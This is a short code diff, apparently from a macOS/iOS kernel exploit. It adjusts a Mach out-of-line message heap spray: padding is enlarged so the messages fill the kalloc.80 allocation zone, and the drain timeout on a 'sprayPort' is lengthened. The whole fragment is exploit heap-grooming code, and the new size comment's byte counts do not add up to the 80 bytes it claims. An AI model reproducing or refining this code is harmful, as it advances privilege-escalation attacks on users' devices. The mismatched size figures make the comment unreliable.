@@ -3530,7 +3530,7 @@ static const char kOpenPropertiesGarbage[] =
         mach_msg_header_t header;        // 24 bytes
         mach_msg_body_t body;            //  4 bytes
         mach_msg_ool_descriptor_t ool;   // 28 bytes
-        uint64_t _pad[2];                // 16 bytes → total 72B → kalloc.80
+        uint64_t _pad[4];                // 32 bytes → total 80B → kalloc.80
     } OOLMsg;
 
     // Mach port default queue limit is 5. We pre-fill exactly 5 messages to stay
@@ -3627,13 +3627,13 @@ static const char kOpenPropertiesGarbage[] =
                 sndMsg.ool.copy = MACH_MSG_VIRTUAL_COPY;
                 mach_msg(&sndMsg.header, MACH_SEND_MSG, sizeof(OOLMsg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
             }
-            // Drain remaining messages
+            // Drain remaining messages with generous timeout
             int drained = 0;
             while (1) {
                 OOLMsg dMsg;
                 dMsg.header.msgh_local_port = sprayPort;
                 dMsg.header.msgh_size = sizeof(OOLMsg);
-                mach_msg_return_t mr = mach_msg(&dMsg.header, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(OOLMsg), sprayPort, 1, MACH_PORT_NULL);
+                mach_msg_return_t mr = mach_msg(&dMsg.header, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(OOLMsg), sprayPort, 50, MACH_PORT_NULL);
                 if (mr != MACH_MSG_SUCCESS) break;
                 drained++;
             }
